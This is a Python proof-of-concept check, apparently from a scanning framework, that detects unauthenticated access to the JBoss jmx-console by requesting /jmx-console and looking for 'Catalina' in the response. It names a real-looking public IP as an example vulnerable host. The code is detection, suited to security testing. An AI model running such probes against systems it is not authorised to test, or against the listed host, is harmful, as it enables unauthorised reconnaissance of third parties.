# coding:utf-8  
import requests
from lib.common import url_handle,get_random_ua
# ...
import urllib3
urllib3.disable_warnings()
_info = {
    "author" : "jijue",                      # POC作者
    "version" : "1",                    # POC版本，默认是1  
    "CreateDate" : "2021-06-09",        # POC创建时间
    "UpdateDate" : "2021-06-09",        # POC创建时间
    "PocDesc" : """
    略  
    """,                                # POC描述，写更新描述，没有就不写

    "name" : "Jboss未授权访问",                        # 漏洞名称
    "AppName" : "Jboss",                     # 漏洞应用名称
    "AppVersion" : "低版本",                  # 漏洞应用版本
    "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
    "VulnDesc" : """
    在低版本中，默认可以访问Jboss web控制台(http://127.0.0.1:8080/jmx-console)，无需用户名和密码。
    """,                                # 漏洞简要描述

    "fofa-dork":"",                     # fofa搜索语句
    "example" : "210.212.62.107:8080",                     # 存在漏洞的演示url，写一个就可以了
    "exp_img" : "",                      # 先不管  

    "timeout" : 8,                      # 超时设定
}

def verify(host,proxy):
    """
    返回vuln

    存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

    不存在漏洞：vuln = [False,""]
    """
    vuln = [False,""]
    url = url_handle(host) + "/jmx-console" # url自己按需调整

    proxies = None
    if proxy:
        proxies = {
        "http": "http://%s"%(proxy),
        "https": "http://%s"%(proxy),
        }

    headers = {"User-Agent":get_random_ua(),
                "Connection":"close",
                # "Content-Type": "application/x-www-form-urlencoded",
                }
    
    try:
        """
        检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
        """
        req = requests.get(url,headers = headers , proxies = proxies ,timeout = _info["timeout"],verify = False)
        if req.status_code == 200 and "Catalina" in req.text:
            vuln = [True,req.text]
        else:
            vuln = [False,req.text]
    except Exception as e:
        raise e
    
    return vuln

